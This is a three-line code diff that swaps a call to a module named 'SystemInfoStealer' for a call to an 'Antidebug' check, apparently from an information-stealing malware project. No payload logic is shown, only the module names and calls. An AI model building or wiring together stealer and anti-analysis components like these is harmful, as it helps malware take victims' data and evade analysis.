@@ -1,3 +1,3 @@
-from modules.systeminfo import system
+from modules.antidebug import antidebug
 
-system.SystemInfoStealer().run()
+antidebug.Antidebug().check()
